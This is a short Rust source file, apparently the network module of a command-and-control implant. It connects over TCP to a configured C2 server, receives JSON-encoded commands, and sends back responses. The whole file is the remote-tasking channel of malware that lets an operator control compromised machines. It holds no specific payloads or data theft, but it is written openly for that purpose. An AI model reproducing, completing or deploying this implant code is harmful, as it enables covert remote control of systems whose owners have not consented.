use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use crate::error::C2Error;
use crate::commands::Command;

pub async fn connect_to_c2(config: &crate::config::Config) -> Result<TcpStream, C2Error> {
    TcpStream::connect(&config.server_address).await.map_err(|e| C2Error::NetworkError(e.to_string()))
}

pub async fn receive_command(socket: &mut TcpStream) -> Result<Command, C2Error> {
    let mut buffer = [0; 1024];
    let n = socket.read(&mut buffer).await.map_err(|e| C2Error::NetworkError(e.to_string()))?;
    serde_json::from_slice(&buffer[..n]).map_err(|e| C2Error::CommandError(e.to_string()))
}

pub async fn send_response(socket: &mut TcpStream, response: &str) -> Result<(), C2Error> {
    socket.write_all(response.as_bytes()).await.map_err(|e| C2Error::NetworkError(e.to_string()))
}
